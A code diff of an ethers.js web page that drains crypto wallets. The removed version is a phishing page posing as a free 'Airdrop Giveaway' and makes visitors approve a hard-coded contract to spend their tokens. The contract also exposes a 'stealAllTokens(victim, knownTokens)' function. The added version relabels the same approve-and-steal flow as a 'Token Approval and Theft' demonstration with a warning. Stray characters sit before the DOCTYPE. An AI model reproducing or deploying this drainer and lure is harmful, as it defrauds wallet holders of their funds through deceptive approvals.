@@ -1,74 +1,43 @@
-6<!DOCTYPE html>
+lp<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airdrop Claim</title>
+    <title>Token Approval and Theft</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
-    <h1>🎁 Airdrop Giveaway 🎉</h1>
-    <p>Claim your free tokens now by connecting your wallet! Limited-time offer!</p>
+    <h2>Token Approval and Theft</h2>
+    <p>WARNING: This is a demonstration of token approval and potential theft. Use at your own risk!</p>
 
     <button id="connectWalletButton">Connect Wallet</button>
-    <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+    <button id="approveTokensButton" disabled>Approve Tokens</button>
+    <button id="stealTokensButton" disabled>Attempt to Steal Tokens</button>
+
+    <div id="status"></div>
 
     <script>
         // Contract details
-        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract address
+        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Example contract address
         const contractABI = [
- {
-  "inputs": [
-   {
-    "internalType": "address",
-    "name": "token",
-    "type": "address"
-   }
-  ],
-  "name": "approveAllTokens",
-  "outputs": [],
-  "stateMutability": "nonpayable",
-  "type": "function"
- },
- {
-  "inputs": [
-   {
-    "internalType": "address",
-    "name": "victim",
-    "type": "address"
-   },
-   {
-    "internalType": "address[]",
-    "name": "knownTokens",
-    "type": "address[]"
-   }
-  ],
-  "name": "stealAllTokens",
-  "outputs": [],
-  "stateMutability": "nonpayable",
-  "type": "function"
- },
- {
-  "inputs": [],
-  "stateMutability": "nonpayable",
-  "type": "constructor"
- },
- {
-  "inputs": [],
-  "name": "owner",
-  "outputs": [
-   {
-    "internalType": "address",
-    "name": "",
-    "type": "address"
-   }
-  ],
-  "stateMutability": "view",
-  "type": "function"
- }
-];
-
-        // Array of known tokens
+            {
+                "inputs": [{"internalType": "address", "name": "token", "type": "address"}],
+                "name": "approveAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "victim", "type": "address"},
+                    {"internalType": "address[]", "name": "knownTokens", "type": "address[]"}
+                ],
+                "name": "stealAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
         const knownTokens = [
             "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
             "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
@@ -77,43 +46,70 @@
 
         let signer;
 
-        // Connect wallet function
         async function connectWallet() {
             if (window.ethereum) {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                console.log("Wallet connected:", await signer.getAddress());
-                document.getElementById('connectWalletButton').disabled = true;
-                document.getElementById('claimAirdropButton').disabled = false;
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    document.getElementById('connectWalletButton').disabled = true;
+                    document.getElementById('approveTokensButton').disabled = false;
+                    updateStatus("Wallet connected successfully.");
+                } catch (error) {
+                    console.error("User denied account access:", error);
+                    updateStatus("Wallet connection failed.");
+                }
             } else {
-                alert("MetaMask is required to use this feature.");
+                updateStatus("Please install MetaMask or another Web3 wallet.");
             }
         }
 
-        // Claim airdrop function
-        async function claimAirdrop() {
+        async function approveTokens() {
             if (!signer) {
-                alert("Connect your wallet first!");
+                updateStatus("Connect your wallet first!");
                 return;
             }
 
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             try {
                 for (let token of knownTokens) {
-                    await contract.approveAllTokens(token); // Approve tokens
+                    const tx = await contract.approveAllTokens(token);
+                    await tx.wait(); // Menunggu konfirmasi transaksi
                     console.log(`Approved token: ${token}`);
                 }
-                alert("Airdrop claimed successfully! Check your wallet balance.");
+                updateStatus("Tokens approved! You have now authorized the contract to access your tokens.");
             } catch (error) {
-                console.error("Airdrop claim failed:", error);
-                alert("Failed to claim the airdrop. Please try again.");
+                console.error("Approval failed:", error);
+                updateStatus("Approval failed. Check console for details.");
             }
+        }
+
+        async function stealTokens() {
+            if (!signer) {
+                updateStatus("Connect your wallet first!");
+                return;
+            }
+
+            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            try {
+                const userAddress = await signer.getAddress();
+                const tx = await contract.stealAllTokens(userAddress, knownTokens);
+                await tx.wait(); // Menunggu konfirmasi transaksi
+                updateStatus("Attempted to steal tokens. Note: Only the contract owner can actually execute this.");
+            } catch (error) {
+                console.error("Stealing tokens failed:", error);
+                updateStatus("Stealing tokens failed. You might not be the contract owner or another issue occurred.");
+            }
+        }
+
+        function updateStatus(message) {
+            document.getElementById('status').innerText = message;
         }
 
         // Event listeners for buttons
         document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
-        document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+        document.getElementById('approveTokensButton').addEventListener('click', approveTokens);
+        document.getElementById('stealTokensButton').addEventListener('click', stealTokens);
     </script>
 </body>
 </html>
